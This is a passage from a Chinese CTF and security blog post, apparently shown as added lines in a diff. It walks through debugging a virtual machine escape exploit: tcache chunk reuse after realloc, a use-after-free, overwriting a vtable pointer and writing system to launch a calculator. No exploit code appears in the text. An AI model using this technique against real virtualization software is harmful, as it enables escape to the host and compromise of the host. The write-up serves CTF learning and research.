/span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure>
+
+<h2 id="0x03-调试"><a href="#0x03-调试" class="headerlink" title="0x03 调试"></a>0x03 调试</h2><p>把断点放在realloc的位置，方便查看realloc后的堆布局。</p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-c15bb21f3a9a8d61cee8d1679228e3378e2a5c53.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
+<p>在第一次free的位置看到了目标chunk，<code>0x7f797803a890</code>，这个chunk就是我们要复用的chunk。此次realloc结束，应该被挂进tcache。</p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-5f6609f03fbf2c05e9a32233dda512666ac8401a.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
+<p>整个chunk的内容，可以看到大小是0x115，这里不知道为啥，连地址都没对齐。</p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-558cbd15fff8d78e9d81193abbc1855318dc2976.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
+<p>单步执行之后，看到被挂进tcache的chunk。当channel 1，alloc取出这块chunk的时候，没有触发到realloc，直接走过去了。所以没断下来。因该在if的判断位置加一个断点，查看堆布局的。</p>
+<p>不过此时可以看一下目标chunk的内容，有没有被改变。</p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-af593aa4f5b88482d210904f17b6bbbdca1fff56.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
+<p>可以看到被挂上了熟悉的fd，但是却没有在相应的tcache里面，则可以推断，该chunk已经是alloc状态了。</p>
+<p>继续执行，第二次free。</p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-cf83f7ba2ba709b640e4e31c373f2f4ce8374f6e.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
+<p>此次realloc依然触发free。</p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-90ca8fba0d3563f28628ce7e637ba491a0af2167.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
+<p>chunk被挂进了tcache，然后下一步执行dnd_version应该会把chunk取出，然后把虚表指针写入。</p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-3af68edeb6ac636b641ed4f28699a57cf02635d0.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
+<p>成功写入，接下来就是改写system的过程。</p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-fbcde0816cf86bb685d83ddcd650d26b20807683.png" srcset="/img/loading.gif" lazyload alt="图片.png"><br> channel 0的第一次free，记住chunk地址，0x7fa59c028e20，然后和leak一眼，对channel 1的UAF。</p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-b5c0c0dd42f4ab7ab018faf0a5ff2962d73667f5.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
+<p>劫持成功，但是此时tcache中却看不到，可能heapinfo有点问题。</p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-08e8e166fe38c1669ae4f225b82c46399d34c220.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
+<p>计算偏移后，目标位置被打入tcache的fd中，然后就是常规利用。把该内存malloc出来。然后写入system</p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-babc2811b8fd15b84ebcde28aab4e8a3ad4d017e.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
+<p>成功写入system，继续执行，然后弹出计算器。<br> <img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-b49b8f237dd3d59e57968a503942f5b52a884c87.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
+<h2 id="0x05-思考"><a href="#0x05-思考" class="headerlink" title="0x05 思考"></a>0x05 思考</h2><p>emm，调试总是遇到一些问题，有时候挂上gdb，leak出来的基址就不对了。。。离谱，不知道为什么。想到的办法是，先发送完payload，然后再attach上去，exp和leak部分分开调试。</p>
+<p>还有虚拟机的vmx，移动的时候，权限关系，可能导致打不开虚拟机，只有使用sudo  vmware才可以打开，不过这样打开的虚拟机，最后可以成功leak和执行，但是弹不出计算器，也就是命令执行失败，报错报了虚拟化错误，搞了好久没解决，最后也是莫名其妙的突然解决了。</p>
+<p>两个vm类型的虚拟机逃逸收获很大，逆向的基础牢固了许多，realworld类的题目和CTF还是有很多差别，前者需要很好的逆向功底和对目标的熟悉，后者更多是技巧上的利用。</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/realworld/">#realworld</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>虚拟机逃逸（二）</div>
+      <div>http://example.com/2022/06/22/虚拟机逃逸（二）/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Epiphany</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年6月22日</div>
+        </div>
+      
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/06/22/%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%80%83%E9%80%B8%EF%BC%88%E4%B8%80%EF%BC%89/" title="虚拟机逃逸（一）">
+                        <span class="hidden-mobile">虚拟机逃逸（一）</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  <article id="comments" lazyload>
+    
+
+  </article>
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div style="font-size: 0.85rem"> <span id="website-duration">载入网站运行时间...</span> <script src="/js/duration.js"></script> </div>   
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script  src="https://lib.baomitu.com/prism/1.27.0/plugins/line-numbers/prism-line-numbers.min.js" ></script>
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
